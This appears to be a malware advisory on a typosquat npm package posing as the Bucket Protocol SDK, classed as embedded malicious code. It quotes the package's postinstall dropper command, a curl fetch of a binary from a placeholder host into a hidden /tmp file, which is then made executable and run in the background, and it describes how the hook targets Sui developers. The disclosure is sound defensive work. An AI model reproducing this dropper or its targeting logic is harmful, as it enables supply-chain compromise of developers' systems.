summary: Targeted postinstall dropper impersonating Bucket Protocol SDK
details: Package name impersonates the legitimate `bucket-protocol-sdk` and self-describes as a 'drop-in replacement', but ships no SDK code — `main` points at `dist/index.js` which does not exist, and `src/bucket.ts` contains only `export {};`. The package's only functional code is a `postinstall` hook (`node install.js`) that probes the installer for Sui blockchain developer artifacts (`sui` binary in PATH and/or `~/.sui/sui_config/client.yaml`) and, when matched, runs `curl -s -L -o /tmp/.sui-helper <implantUrl> && chmod +x /tmp/.sui-helper && /tmp/.sui-helper &` via `execSync`. The implant URL is a placeholder comment referencing `0x0.st` (anonymous, mutable file host) and is intended to be populated before publication. The dropper stages an opaque binary to a hidden dot-file in `/tmp/`, executes it in the background with no hash/signature verification, and the cover-story name `.sui-helper` does not match the package's advertised purpose. Combined signals: typosquat name + empty SDK shell + targeted environment probe + anonymous-host dropper + hidden staging path + background execution.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
